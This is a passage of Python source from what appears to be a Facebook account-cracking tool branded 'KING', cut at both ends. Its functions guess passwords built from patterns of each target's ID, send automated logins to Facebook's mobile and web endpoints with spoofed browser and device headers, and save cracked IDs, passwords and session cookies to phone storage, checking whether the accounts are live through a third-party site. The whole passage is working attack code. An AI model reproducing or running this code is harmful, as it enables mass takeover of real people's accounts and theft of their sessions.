":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"F2_FLOW\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"contact_point\\":\\"'+idf+'\\",\\"password\\":\\"'+pwd+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}'}
			cookies = {
    'datr': 'IU6wZ_N1SNDxz9TvbprJXpmB',
    'sb': 'IU6wZ8g2vZTr32j8kUcvXOai',
    'ps_l': '1',
    'ps_n': '1',
    'dpr': '2.3369150161743164',
    'm_pixel_ratio': '2.125537157058716',
    'wd': '508x1009',
    'fr': '0tvhzqdRTxem3G3mB.AWXXMeL5ARKAhTPeUU27obkZe1yUaHWFS3hkLg.BnsE4h..AAA.0.0.BnsY2P.AWURWEQ7TZk'}
			head = {
    'authority': 'm.facebook.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    # 'cookie': 'datr=IU6wZ_N1SNDxz9TvbprJXpmB; sb=IU6wZ8g2vZTr32j8kUcvXOai; ps_l=1; ps_n=1; dpr=2.3369150161743164; m_pixel_ratio=2.125537157058716; wd=508x1009; fr=0tvhzqdRTxem3G3mB.AWXXMeL5ARKAhTPeUU27obkZe1yUaHWFS3hkLg.BnsE4h..AAA.0.0.BnsY2P.AWURWEQ7TZk',
    'origin': 'https://m.facebook.com',
    'referer': 'https://m.facebook.com/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': f'"{modelx}"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': f'"{andr}"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': ust}
			mahin_back = ses.post("https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=2c4733784ae1256fe36c8fac264a2939b8558cfc1bad5ac672c9bc60482cab5a",headers=head, data=date, cookies=cookies)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				if 'Gmail' in gxmxl:
					match = re.search(r'c_user=([^;]+)', kuki)
					idf = match.group(1) if match else None
					with open('/sdcard/KING-Gmail-ids-with-Cookies.txt', 'r') as f:
						fo = f.read()
					if idf in fo:
						open('/sdcard/'+'KING-Dubble-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
					else:
						ok+=1
						print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'KING-Gmail-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
						
						if 'y' in cokix:
							print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
						if 'y' in apxx:
							application_check(ses,kuki)
					break
				else:
					ok+=1
					print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{H}{pw}{N}');open('/sdcard/'+'KING-File-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
					
					if 'y' in cokix:
						print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
					if 'y' in apxx:
						application_check(ses,kuki)
					break
			elif "checkpoint" in mahin_back.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				open('/sdcard/'+'KING-CP.txt','a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
#for random method
def rdm1(idf,pwv,names):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	animasi = random.choice(["\x1b[1;91mKING-M1","\x1b[1;92mKING-M1","\x1b[1;93mKING-M1","\x1b[1;94mKING-M1","\x1b[1;95mKING-M1","\x1b[1;96mKING-M1","\x1b[1;97mKING-M1","\x1b[1;91mKING-M1","\x1b[1;92mKING-M1","\x1b[1;93mKING-M1","\x1b[1;94mKING-M1","\x1b[1;95mKING-M1","\x1b[1;96mKING-M1"])
	sys.stdout.write(f'\r{K} [{animasi}{K}] {K}({H}%s{K}){U}+{H}OK{K}({H}%s{K}){P}\r'%(loop,(ok)));sys.stdout.flush()
	for pow in pwv:
		try:
			pw = pow.replace('first6',idf[:6]).replace('first7',idf[:7]).replace('first8',idf[:8]).replace('last6',idf[5:]).replace('last7',idf[4:]).replace('last8',idf[3:]).replace('number',idf).replace('last9',idf[1:])
			link = ses.get("https://m.facebook.com/login/")
			date = {
    'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
    'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
    'email': idf,
    'timezone': '-360',
    'lgndim': 'eyJ3Ijo0MzIsImgiOjk2MCwiYXciOjQzMiwiYWgiOjk2MCwiYyI6MjR9',
    'lgnrnd': '043653_v1h1',
    'lgnjs': f"{str(kontol()).split('.')[0]}",
    'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAX',
    'locale': 'en_GB',
    'next': 'https://web.facebook.com/biz/directory/',
    'login_source': 'login_bluebar',
    'guid': 'fc54fcea23208b8bd',
    'prefill_contact_point': idf,
    'prefill_source': 'browser_dropdown',
    'prefill_type': 'contact_point',
    'encpass': f"#PWD_BROWSER:0:{str(kontol()).split('.')[0]}:{pw}"}
			head = {
    'authority': 'web.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
     'cookie': ("; ".join([str(x)+"="+str(y) for x,y in ses.cookies.get_dict().items()])),
    'dpr': '2.5',
    'origin': 'https://web.facebook.com',
    'referer': 'https://web.facebook.com/biz/directory/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'viewport-width': '980'}
			cokis = {
    'datr': 'm9S0Z9faUvOkO3Jzltk0wzzT',
    'sb': 'm9S0Z8xn2Zd_G4Ge5AolS1ox',
    'locale': 'en_US',
    'wl_cbv': f"v2%3Bclient_version%3A2744%3Btimestamp%3A{str(kontol()).split('.')[0]}",
    'vpd': 'v1%3B858x432x2.125537157058716',
    'dpr': '2.3369150161743164',
    'ps_l': '1',
    'ps_n': '1',
    'fr': '1Ik3gXMyRrn8lOstJ.AWXwpnzBz8DQmh5AbsyMSIFLDcgrbS6dZiJ5DA.Bntc-T..AAA.0.0.BntdBg.AWXfkG1jUmo',
    'wd': '1049x1174'}
			mahin_back = ses.post("https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110",headers=head, data=date, cookies=cokis, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				match = re.search(r'c_user=([^;]+)', kuki)
				idf = match.group(1) if match else None
				open('/sdcard/'+'KING-All-Ok-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
				try:
					liveck= requests.get(f'https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={idf}').text
					if 'live' in liveck:
						print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{GREEN}{pw}{N}')
						if 'y' in cokix:
							print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
						if 'y' in apxx:
							application_check(ses,kuki)
						
						open('/sdcard/'+'KING-live-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
					elif 'die' in liveck:
						open('/sdcard/'+'KING-death-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
					else:
						open('/sdcard/'+'KING-Mix-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
				except:pass
				break
			elif "checkpoint" in mahin_back.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				open('/sdcard/'+'KING-CP.txt','a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(10)
	loop+=1
def rdm2(idf,pwv,names):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	animasi = random.choice(["\x1b[1;91mKING-M2","\x1b[1;92mKING-M2","\x1b[1;93mKING-M2","\x1b[1;94mKING-M2","\x1b[1;95mKING-M2","\x1b[1;96mKING-M2","\x1b[1;97mKING-M2","\x1b[1;91mKING-M2","\x1b[1;92mKING-M2","\x1b[1;93mKING-M2","\x1b[1;94mKING-M2","\x1b[1;95mKING-M2","\x1b[1;96mKING-M2"])
	sys.stdout.write(f'\r{K} [{animasi}{K}] {K}({H}%s{K}){U}+{H}OK{K}({H}%s{K}){P}\r'%(loop,(ok)));sys.stdout.flush()
	try:
		for pow in pwv:
			pw = pow.replace('first6',idf[:6]).replace('first7',idf[:7]).replace('first8',idf[:8]).replace('last6',idf[5:]).replace('last7',idf[4:]).replace('last8',idf[3:]).replace('number',idf).replace('last9',idf[1:])
			link = ses.get("https://m.facebook.com/login/")
			date = {
    'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
    'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
    'email': idf,
    'timezone': '-360',
    'lgndim': 'eyJ3Ijo0MzIsImgiOjk2MCwiYXciOjQzMiwiYWgiOjk2MCwiYyI6MjR9',
    'lgnrnd': '043653_v1h1',
    'lgnjs': '1739968613',
    'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAX',
    'locale': 'en_GB',
    'next': 'https://web.facebook.com/biz/directory/',
    'login_source': 'login_bluebar',
    'guid': 'fc54fcea23208b8bd',
    'prefill_contact_point': idf,
    'prefill_source': 'browser_dropdown',
    'prefill_type': 'contact_point',
    'encpass': f"#PWD_BROWSER:0:{str(kontol()).split('.')[0]}:{pw}"}
			head = {
    'authority': 'web.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
     'cookie': ("; ".join([str(x)+"="+str(y) for x,y in ses.cookies.get_dict().items()])),
    'dpr': '2.5',
    'origin': 'https://web.facebook.com',
    'referer': 'https://web.facebook.com/biz/directory/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': f'"{rc(["Linux","Windows","MacOS","Android","iOS"])}"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': random_user_agent(),
    'viewport-width': '980'}
			mahin_back = ses.post("https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110",headers=head, data=date, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				match = re.search(r'c_user=([^;]+)', kuki)
				idf = match.group(1) if match else None
				open('/sdcard/'+'KING-All-Ok-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
				try:
					liveck= requests.get(f'https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={idf}').text
					if 'live' in liveck:
						print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{GREEN}{pw}{N}')
						if 'y' in cokix:
							print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
						if 'y' in apxx:
							application_check(ses,kuki)
						
						open('/sdcard/'+'KING-live-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
					elif 'die' in liveck:
						open('/sdcard/'+'KING-death-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
					else:
						pass
				except:pass
				break			
			elif "checkpoint" in mahin_back.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				open('/sdcard/'+'KING-CP.txt','a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)

def rdm3(idf,pwv,names):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	animasi = random.choice(["\x1b[1;91mKING-M3","\x1b[1;92mKING-M3","\x1b[1;93mKING-M3","\x1b[1;94mKING-M3","\x1b[1;95mKING-M3","\x1b[1;96mKING-M3","\x1b[1;97mKING-M3","\x1b[1;91mKING-M3","\x1b[1;92mKING-M3","\x1b[1;93mKING-M3","\x1b[1;94mKING-M3","\x1b[1;95mKING-M3","\x1b[1;96mKING-M3"])
	sys.stdout.write(f'\r{K} [{animasi}{K}] {K}({H}%s{K}){U}+{H}OK{K}({H}%s{K}){P}\r'%(loop,(ok)));sys.stdout.flush()
	for pow in pwv:
		try:
			pw = pow.replace('first6',idf[:6]).replace('first7',idf[:7]).replace('first8',idf[:8]).replace('last6',idf[5:]).replace('last7',idf[4:]).replace('last8',idf[3:]).replace('number',idf).replace('last9',idf[1:])
			link = ses.get("https://m.facebook.com/login/")
			pwd = f"#PWD_BROWSER:0:{str(kontol()).split('.')[0]}:{pw}"
			adid = str(uuid.uuid4())
			ust = unoxd()
			modelx = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
			andr = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
			date = {
    '__aaid': '0',
    '__user': '0',
    '__a': '1',
    '__req': rc(["b","k","g","s","j","w","u","x","l","e","f","y","h","a","t","m","d","p","r","q","c","i","n","z","o","v"]),
    '__hs': '20135.BP:wbloks_caa_pkg.2.0...0',
    'dpr': '1',
    '__ccg': 'EXCELLENT',
    '__rev': '1020155676',
    '__s': 'timdlg:qn4494:16ybr6',
    '__hsi': '7471908770505157669',
    '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
    '__csr': '',
    'fb_dtsg': 'NAcNS73agICQMvkg__aPN7WtpkP_Ai3lBqzsizF6Ef56qm4kXM6e8-Q:0:0',
    'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
    'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
    'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"a3wxbs:68\\",\\"password_text_input_id\\":\\"a3wxbs:69\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"61123679200409\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+adid+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"F2_FLOW\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"contact_point\\":\\"'+idf+'\\",\\"password\\":\\"'+pwd+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}'}
			cookies = {
    'datr': 'IU6wZ_N1SNDxz9TvbprJXpmB',
    'sb': 'IU6wZ8g2vZTr32j8kUcvXOai',
    'ps_l': '1',
    'ps_n': '1',
    'dpr': '2.3369150161743164',
    'm_pixel_ratio': '2.125537157058716',
    'wd': '508x1009',
    'fr': '0tvhzqdRTxem3G3mB.AWXXMeL5ARKAhTPeUU27obkZe1yUaHWFS3hkLg.BnsE4h..AAA.0.0.BnsY2P.AWURWEQ7TZk'}
			head = {
    'authority': 'm.facebook.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    # 'cookie': 'datr=IU6wZ_N1SNDxz9TvbprJXpmB; sb=IU6wZ8g2vZTr32j8kUcvXOai; ps_l=1; ps_n=1; dpr=2.3369150161743164; m_pixel_ratio=2.125537157058716; wd=508x1009; fr=0tvhzqdRTxem3G3mB.AWXXMeL5ARKAhTPeUU27obkZe1yUaHWFS3hkLg.BnsE4h..AAA.0.0.BnsY2P.AWURWEQ7TZk',
    'origin': 'https://m.facebook.com',
    'referer': 'https://m.facebook.com/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': f'"{modelx}"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': f'"{andr}"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': ust}
			mahin_back = ses.post("https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=2c4733784ae1256fe36c8fac264a2939b8558cfc1bad5ac672c9bc60482cab5a",headers=head, data=date, cookies=cookies)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				match = re.search(r'c_user=([^;]+)', kuki)
				idf = match.group(1) if match else None
				open('/sdcard/'+'KING-All-Ok-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
				try:
					liveck= requests.get(f'https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={idf}').text
					if 'live' in liveck:
						print(f'{K} [{H}FB-KING-OK{K}] {H}{idf}{N}|{GREEN}{pw}{N}')
						if 'y' in cokix:
							print(f'{K} [{H}ids-cookie{K}] {warna}{kuki}{N}')
						if 'y' in apxx:
							application_check(ses,kuki)
						
						open('/sdcard/'+'KING-live-ids-with-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
					elif 'die' in liveck:
						open('/sdcard/'+'KING-death-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
					else:
						open('/sdcard/'+'KING-Temp-ids-With-Cookies.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
				except:pass
				break			
			elif "checkpoint" in mahin_back.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				open('/sdcard/'+'KING-CP.txt','a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(10)
	loop+=1
def rdm4(idf,pwv,names):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	animasi = random.choice(["\x1b[1;91mKING-M4","\x1b[1;92mKING-M4","\x1b[1;93mKING-M4","\x1b[1;94mKING-M4","\x1b[1;95mKING-M4","\x1b[1;96mKING-M4","\x1b[1;97mKING-M4","\x1b[1;91mKING-M4","\x1b[1;92mKING-M4","\x1b[1;93mKING-M4","\x1b[1;94mKING-M4","\x1b[1;95mKING-M4","\x1b[1;96mKING-M4"])
	sys.stdout.write(f'\r{K} [{animasi}{K}] {K}({H}%s{K}){U}+{H}OK{K}({H}%s{K}){P}\r'%(loop,(ok)));sys.stdout.flush()
	for pow in pwv:
		try:
			pw = pow.replace('first6',idf[:6]).replace('first7',idf[:7]).replace('first8',idf[:8]).replace('last6',idf[5:]).replace('last7',idf[4:]).replace('last8',idf[3:]).replace('number',idf).replace('last9',idf[1:])
			htd = {
    'authority': 'web.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=aA6mZ5W--xxtNdZOvLrqqtk4; sb=aA6mZyD5-WQ8_n3qPlZtiLot; ps_l=1; ps_n=1; locale=en_US; vpd=v1%3B858x432x2.125537157058716; wl_cbv=v2%3Bclient_version%3A2736%3Btimestamp%3A1739000557; m_pixel_ratio=2.125537157058716; dpr=2.3369150161743164; wd=1049x2082; fr=0w9DKWZX1IuXOcrys.AWWuU9kV7glPW4nqO9eqA_Qpc3QscNg1F-FJdw.Bnpg5o..AAA.0.0.BnpxMI.AWVjYwHc4ao',
    'dpr': '2.5',
    'referer': 'https://auth.meta.com/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'viewport-width': '980'}
			link = ses.get("https://web.facebook.com/index.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Foidc%252Ffacebook%252Fresponse%252F%26response_type%3Dcode%26scope%3Dopenid%2Blinking%26state%3DATCNkUfmV7-kT0H_apZVQlcFn--3sOg0SHirNncdQpz_WkKOIzO0MitlZMTdJMx04EjwGB1EcZMj-Ms_aF9WhhECscITcHQAux07FUFFSA6nrJ0POAczo16FEuBJ4f5MuzrEiYVMa-eazzu2jRHr4TfEg_h3Ghwbjh-GV5Fq66BS9741wVg9qq6jWWHwisx8SGI6cJXHwL4htDXoFrROQ6ji1y0HIQCNG9X4T1vQ9wzcjRfxVy8LcZJDMJ9sXmtjKTccIxtUS2e67Uxv4Gc1FR6vf-IbNlXJP_mcaXf-WZQP3WLB0WFbhdDUA4gUNZujDP-a59qmdnjEzBLVp7Qg7m_p9mziUqWUHJilUBCYbZZ_Sh0IT2_UIolI_TSiaJSLMOHTSiPMNRNgVJayYDwa2hNFZ_WwRtaaflhrBPruk8U4e4wwBQwIyVB0YVPxNnEWidoF2Oe7Vy8xHBCu6w4F4iLL_I-iILVQVBFltUji6w3xMOu8SpvDu6AAwo82ISZIlEGPmFZ0Xzx6MWzgvo_papReuXQV2zRpdPFWAZXJDg6F0EyObRerYq6a4DDD2oNomkbgCHZtXVy5pU9om7AeZFag5SfXc2soPlND2ZWfV0pghVP71QRrIvyKi5UaYDV0VFtbGBpp29d2BetNsdbW807xPY5f5nw2Sg3NO4P6WioxTZVqii9wCsvirc8WzKB4tSg9AAo_jCd2-aIP42XD43hpAFebRN83QN7J34U_CyQLjAN-3Hd0wTIpAqobOWxGFSNy2VhDAGPa_5Kot2xKRx1vAmkgsoWqEwbiVWBLZwgog-CguHjOEva8zhWNQyykfV1RB81MytGj9z8KJlZxNflstuA6HkvXeufJPx-bP6dthJREdQGuhgBRk6ngR9cSAuIZLHkbfa0Y_UzfJYuRaZ-xjzD8PYDzJuNaK3VLuOOjZRcSNYkY9N42NdHwPe8JuCHASsQcc67r9YrbBgTEDDRd-hPsFzGJNlSD59nynsFgYHQamIgzL4d-r6zpMo6Hp52g4WXLO5sOkP2OOePY6iyGzTPM35qLHZScm-SSBFB4AdMIE7oWOTfrWV7dLISiZb-xr6KHzt6JQ1MDi1EdaJJBN9ruKkabCBFS8izVNDZO57TAxAFtJ2eMw5Ly-7TrptyrMOvYtpchrgXfCwNTANo5RVGdkckbtMdK0gsE1AKV&deoia=1&no_universal_links=1&_rdc=1&_rdr",headers=htd)
			date = {'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
	'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
	'email': idf,
    'login_source': 'comet_headerless_login',
    'next': 'https://web.facebook.com/oidc/?app_id=322935469656730&redirect_uri=https%3A%2F%2Fauth.meta.com%2Foidc%2Ffacebook%2Fresponse%2F&response_type=code&scope=openid+linking&state=ATCNkUfmV7-kT0H_apZVQlcFn--3sOg0SHirNncdQpz_WkKOIzO0MitlZMTdJMx04EjwGB1EcZMj-Ms_aF9WhhECscITcHQAux07FUFFSA6nrJ0POAczo16FEuBJ4f5MuzrEiYVMa-eazzu2jRHr4TfEg_h3Ghwbjh-GV5Fq66BS9741wVg9qq6jWWHwisx8SGI6cJXHwL4htDXoFrROQ6ji1y0HIQCNG9X4T1vQ9wzcjRfxVy8LcZJDMJ9sXmtjKTccIxtUS2e67Uxv4Gc1FR6vf-IbNlXJP_mcaXf-WZQP3WLB0WFbhdDUA4gUNZujDP-a59qmdnjEzBLVp7Qg7m_p9mziUqWUHJilUBCYbZZ_Sh0IT2_UIolI_TSiaJSLMOHTSiPMNRNgVJayYDwa2hNFZ_WwRtaaflhrBPruk8U4e4wwBQwIyVB0YVPxNnEWidoF2Oe7Vy8xHBCu6w4F4iLL_I-iILVQVBFltUji6w3xMOu8SpvDu6AAwo82ISZIlEGPmFZ0Xzx6MWzgvo_papReuXQV2zRpdPFWAZXJDg6F0EyObRerYq6a4DDD2oNomkbgCHZtXVy5pU9om7AeZFag5SfXc2soPlND2ZWfV0pghVP71QRrIvyKi5UaYDV0VFtbGBpp29d2BetNsdbW807xPY5f5nw2Sg3NO4P6WioxTZVqii9wCsvirc8WzKB4tSg9AAo_jCd2-aIP42XD43hpAFebRN83QN7J34U_CyQLjAN-3Hd0wTIpAqobOWxGFSNy2VhDAGPa_5Kot2xKRx1vAmkgsoWqEwbiVWBLZwgog-CguHjOEva8zhWNQyykfV1RB81MytGj9z8KJlZxNflstuA6HkvXeufJPx-bP6dthJREdQGuhgBRk6ngR9cSAuIZLHkbfa0Y_UzfJYuRaZ-xjzD8PYDzJuNaK3VLuOOjZRcSNYkY9N42NdHwPe8JuCHASsQcc67r9YrbBgTEDDRd-hPsFzGJNlSD59nynsFgYHQamIgzL4d-r6zpMo6Hp52g4WXLO5sOkP2OOePY6iyGzTPM35qLHZScm-SSBFB4AdMI